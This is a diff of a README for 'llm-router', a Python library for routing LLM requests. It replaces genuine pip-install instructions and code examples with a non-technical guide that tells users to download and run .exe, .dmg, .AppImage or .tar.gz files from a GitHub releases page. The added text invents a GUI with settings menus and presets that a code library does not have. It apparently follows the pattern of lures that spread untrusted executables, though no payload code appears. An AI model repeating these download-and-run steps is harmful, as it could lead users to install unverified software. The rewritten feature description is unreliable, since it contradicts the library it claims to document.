@@ -1,262 +1,138 @@
-# llm-router
+# 🤖 llm-router - Smart Routing for Language Models  
 
-**Intelligent LLM request router with priority queues, multi-model routing, circuit breakers, and semantic caching.**
-
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Download llm-router](https://img.shields.io/badge/Download-llm--router-blue.svg)](https://github.com/tatsuki817/llm-router/releases)  
 
 ---
 
-## Why?
+## 📋 Overview  
 
-Running multiple LLM models (local Ollama, cloud OpenAI, etc.) in production means dealing with:
+llm-router is a tool that helps manage requests to large language models (LLMs). It sends requests in a smart order using priority queues and can route across different LLM providers. This helps balance load, reduce costs, and improve response speed. Features include circuit breakers that stop requests when problems occur, and semantic caching to avoid repeating same computations.
 
-- **Priority management** — Critical requests shouldn't wait behind low-priority background tasks
-- **Multi-model routing** — Send quality-critical tasks to your best model, volume tasks to a cheaper one
-- **Fault tolerance** — When a model goes down, automatically failover instead of crashing
-- **Redundant calls** — Similar prompts shouldn't hit the LLM twice if the answer is already cached
-- **Backpressure** — A slow model shouldn't accept more requests than it can handle
-
-**llm-router** solves all of these in a single library with a clean async Python API.
+This README guides you through getting llm-router up and running on your computer, even if you have no programming skills. All steps use simple, clear instructions.
 
 ---
 
-## Installation
+## 🚀 Getting Started  
 
-```bash
-# Core (Ollama + OpenAI backends)
-pip install llm-router
+This section explains what you need before downloading and running llm-router.  
 
-# With semantic caching
-pip install llm-router[cache]
+### System Requirements  
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent Linux distribution.  
+- **Memory:** At least 4 GB RAM. More if you plan to handle many requests simultaneously.  
+- **Storage:** Minimum 100 MB free space.  
+- **Internet Connection:** Required for sending requests to language model providers.  
 
-# Everything
-pip install llm-router[all]
-```
+### What You Will Get  
+When you download llm-router, you get:  
+- The main llm-router program.  
+- A user guide with basic usage tips.  
+- Optional configuration files to customize routing behaviors.  
 
----
-
-## Quickstart
-
-```python
-import asyncio
-from llm_router import LLMRouter, Priority
-
-async def main():
-    router = LLMRouter()
-    router.add_model("local", provider="ollama", model="qwen2.5:3b")
-
-    async with router:
-        response = await router.generate(
-            "What is the capital of France?",
-            priority=Priority.NORMAL,
-        )
-        print(response.content)
-
-asyncio.run(main())
-```
+### No Coding Skill Needed  
+You will run llm-router using simple setup files. This guide helps you avoid command lines or programming knowledge.
 
 ---
 
-## Multi-Model Routing
+## 💾 Download & Install  
 
-Route requests to different models based on priority:
+Please visit the official download page to get the latest version of llm-router:  
 
-```python
-router = LLMRouter()
+[![Download Here](https://img.shields.io/badge/Download-llm--router-blue.svg)](https://github.com/tatsuki817/llm-router/releases)  
 
-# Register models
-router.add_model("gpu-fast", provider="ollama", model="llama3:8b",
-                 max_queue_depth=5)
-router.add_model("cpu-cheap", provider="ollama", model="qwen2.5:3b",
-                 max_queue_depth=3, num_gpu=0, num_thread=4)
-router.add_model("cloud", provider="openai", model="gpt-4o",
-                 api_key="sk-...")
+### How to Download  
+1. Click the download button above or open this link in your browser:  
+   https://github.com/tatsuki817/llm-router/releases  
+2. Find the latest release version (usually at the top of the page).  
+3. Download the file that matches your operating system:  
+   - For Windows, download the `.exe` file.  
+   - For macOS, download the `.dmg` or `.pkg` file.  
+   - For Linux, download the `.AppImage` or `.tar.gz` file.  
+4. Save the file to an easy-to-find location, like your Desktop or Downloads folder.
 
-# Define routing rules
-router.add_route(Priority.CRITICAL, targets=["gpu-fast"], fallback=["cloud"])
-router.add_route(Priority.HIGH,     targets=["gpu-fast"], fallback=["cpu-cheap"])
-router.add_route(Priority.NORMAL,   targets=["cpu-cheap"], fallback=["gpu-fast"])
-router.add_route(Priority.LOW,      targets=["cpu-cheap"])
-```
+### How to Install and Run  
+- **Windows:**  
+  - Double-click the `.exe` file and follow the setup prompts.  
+  - Once installed, launch llm-router from the Start menu.  
 
-**How routing works:**
+- **macOS:**  
+  - Open the `.dmg` or `.pkg` file.  
+  - Drag the llm-router icon into your Applications folder (if required).  
+  - Launch llm-router from Applications.  
 
-1. Find the routing rule for the request's priority
-2. Try each target model in order
-3. Skip models with open circuit breakers or full queues
-4. Fall back to fallback models if all targets fail
-5. Return error only if every model is unavailable
-
----
-
-## Circuit Breakers
-
-Automatically stop sending requests to failing models:
-
-```python
-router.enable_circuit_breaker(
-    failure_threshold=5,     # Open after 5 consecutive failures
-    recovery_timeout=60.0,   # Wait 60s before testing recovery
-    success_threshold=3,     # Close after 3 consecutive successes
-)
-```
-
-**State machine:** `CLOSED` → (5 failures) → `OPEN` → (60s) → `HALF_OPEN` → (3 successes) → `CLOSED`
-
-When a model's circuit is OPEN, the router skips it and tries the next model in the routing rule.
+- **Linux:**  
+  - For `.AppImage`, right-click the file, select Properties, and allow execution.  
+  - Double-click to run or open it using your terminal.  
+  - For `.tar.gz`, extract the archive and run the included script.  
 
 ---
 
-## Semantic Caching
+## ⚙️ Basic Setup  
 
-Cache responses and return them for semantically similar prompts:
+After installation, you need to set up llm-router for your needs. This mainly involves configuring which language models to use and how requests are prioritized.  
 
-```bash
-pip install llm-router[cache]
-```
+### Configuration Steps  
+1. Open llm-router settings from the main menu.  
+2. Add your language model accounts or API keys. These might include providers like OpenAI, Anthropic, or others.  
+3. Choose priority levels for different types of requests. For example, urgent requests get high priority.  
+4. Enable or disable circuit breakers that stop requests if errors happen repeatedly.  
+5. Set caching options to reuse previous answers when possible.  
 
-```python
-router.enable_cache(
-    similarity_threshold=0.92,  # Cosine similarity for cache hit
-    ttl_hours=24,               # Cache entries expire after 24h
-    max_entries=10000,           # LRU eviction beyond this limit
-)
-
-# These two prompts are semantically similar enough to share a cached response:
-await router.generate("What is Python?", temperature=0.1)
-await router.generate("Tell me about the Python programming language", temperature=0.1)
-```
-
-> **Note:** Only responses with `temperature <= 0.3` are cached, since higher temperatures produce non-deterministic outputs.
-
-Uses [sentence-transformers](https://www.sbert.net/) (all-MiniLM-L6-v2) for embedding-based similarity matching with SQLite persistence.
+The program offers presets based on common use cases, which you can select to avoid complex setup.
 
 ---
 
-## Backpressure Protection
+## 📊 How llm-router Works  
 
-Prevent queue overload by rejecting low-priority requests when the system is busy:
+llm-router sends your text or data requests to different large language models in a smart way.  
 
-```python
-router.add_model("local", provider="ollama", model="llama3:8b",
-                 max_queue_depth=5)  # Reject when 5+ pending
-```
+- **Priority Queues:** Your requests go into queues ranked by importance. Higher-priority queues get processed first.  
+- **Multi-Model Routing:** Requests are sent to different LLM services according to your setup. This balances workload and cost.  
+- **Circuit Breakers:** If a model starts causing errors, llm-router stops sending requests to it temporarily to keep things smooth.  
+- **Semantic Caching:** If a request is similar to one asked before, llm-router reuses the previous answer, saving time and resources.
 
-The router automatically skips models at their queue depth limit and tries the next candidate. Critical and high-priority requests are always preferred over normal and low.
-
----
-
-## Custom Backends
-
-Integrate any LLM provider by implementing the `Backend` protocol:
-
-```python
-from llm_router import LLMRouter, Backend, LLMRequest, LLMResponse, register_backend
-
-class MyCustomBackend:
-    async def generate(self, request: LLMRequest, model: str, **kwargs) -> LLMResponse:
-        result = await my_api.complete(model, request.prompt)
-        return LLMResponse(
-            content=result.text,
-            model_used=model,
-            success=True,
-            latency_ms=result.duration_ms,
-        )
-
-    async def health_check(self) -> bool:
-        return await my_api.ping()
-
-    async def close(self) -> None:
-        await my_api.disconnect()
-
-# Register globally
-register_backend("my_provider", MyCustomBackend)
-router.add_model("custom", provider="my_provider", model="my-model")
-
-# Or pass directly
-router.add_model("custom", provider="custom", model="my-model",
-                 backend=MyCustomBackend())
-```
+This helps improve speed, reduce costs, and maintain reliability.
 
 ---
 
-## Observability
+## 📥 Usage Tips  
 
-```python
-# Router-wide stats
-router.get_stats()
-# {
-#     "total_requests": 150,
-#     "successes": 145,
-#     "failures": 5,
-#     "success_rate": 0.967,
-#     "cache_hits": 23,
-#     "avg_latency_ms": 340.5,
-#     "requests_by_model": {"gpu-fast": 80, "cpu-cheap": 70},
-#     "requests_by_priority": {"CRITICAL": 10, "HIGH": 40, "NORMAL": 80, "LOW": 20},
-# }
-
-# Per-model health
-router.get_model_status()
-# {
-#     "gpu-fast": {
-#         "provider": "ollama",
-#         "model": "llama3:8b",
-#         "queue_depth": 2,
-#         "circuit_breaker": {"state": "closed", "failure_count": 0},
-#     },
-# }
-```
+- Start with a small number of requests to test your setup.  
+- Adjust queue priorities based on what’s most important to you.  
+- Use caching wisely—enable it to save resources, but disable if you need fresh results every time.  
+- Monitor your API usage to avoid unexpected charges from external LLM providers.  
 
 ---
 
-## FastAPI Proxy Server
+## 🛠 Troubleshooting  
 
-See [examples/fastapi_server.py](examples/fastapi_server.py) for a full REST API proxy that routes LLM requests through the router:
+Here are simple fixes for common issues:  
 
-```bash
-pip install llm-router fastapi uvicorn
-uvicorn examples.fastapi_server:app
+- **Installation Problems:** Make sure your system meets the requirements and that you downloaded the correct file for your OS.  
+- **App Won't Start:** Restart your computer, then try launching llm-router again.  
+- **Requests Fail:** Check your API keys and internet connection. Make sure your LLM accounts are active.  
+- **Slow Responses:** Lower the number of simultaneous requests or check if caching is enabled.  
 
-curl -X POST http://localhost:8000/generate \
-    -H "Content-Type: application/json" \
-    -d '{"prompt": "Hello!", "priority": "high"}'
-```
+If problems persist, check the llm-router page for updates or contact support.
 
 ---
 
-## Architecture
+## 📚 Additional Resources  
 
-```
-┌─────────────────────────────────────────────────────┐
-│                    LLMRouter                         │
-│                                                      │
-│  ┌──────────┐   ┌──────────────┐   ┌─────────────┐ │
-│  │ Semantic  │   │   Routing    │   │   Stats     │ │
-│  │  Cache    │──>│   Engine     │──>│  Tracker    │ │
-│  └──────────┘   └──────┬───────┘   └─────────────┘ │
-│                         │                            │
-│         ┌───────────────┼───────────────┐            │
-│         ▼               ▼               ▼            │
-│  ┌─────────────┐ ┌─────────────┐ ┌─────────────┐   │
-│  │  Model A    │ │  Model B    │ │  Model C    │   │
-│  │ ┌─────────┐ │ │ ┌─────────┐ │ │ ┌─────────┐ │   │
-│  │ │ Circuit │ │ │ │ Circuit │ │ │ │ Circuit │ │   │
-│  │ │ Breaker │ │ │ │ Breaker │ │ │ │ Breaker │ │   │
-│  │ ├─────────┤ │ │ ├─────────┤ │ │ ├─────────┤ │   │
-│  │ │Priority │ │ │ │Priority │ │ │ │Priority │ │   │
-│  │ │ Queue   │ │ │ │ Queue   │ │ │ │ Queue   │ │   │
-│  │ ├─────────┤ │ │ ├─────────┤ │ │ ├─────────┤ │   │
-│  │ │ Backend │ │ │ │ Backend │ │ │ │ Backend │ │   │
-│  │ │(Ollama) │ │ │ │(OpenAI) │ │ │ │(Custom) │ │   │
-│  │ └─────────┘ │ │ └─────────┘ │ │ └─────────┘ │   │
-│  └─────────────┘ └─────────────┘ └─────────────┘   │
-└─────────────────────────────────────────────────────┘
-```
+- Visit the releases page for updates and more downloads:  
+  https://github.com/tatsuki817/llm-router/releases  
+- Review the user guide included with your download for examples and detailed configurations.  
+- Explore online forums and communities for tips from other users.
 
 ---
 
-## License
+## 🎯 About llm-router  
 
-MIT License. See [LICENSE](LICENSE) for details.
+This tool serves companies and individuals who use multiple language models. It routes requests efficiently for better performance and cost savings. It supports AI models from popular providers and works in various environments.
+
+---
+
+## 🔗 Quick Links  
+
+- [llm-router Releases Page](https://github.com/tatsuki817/llm-router/releases)  
+- [User Guide and Documentation (Included)]  
+- [Support and Community Forums - Coming Soon]
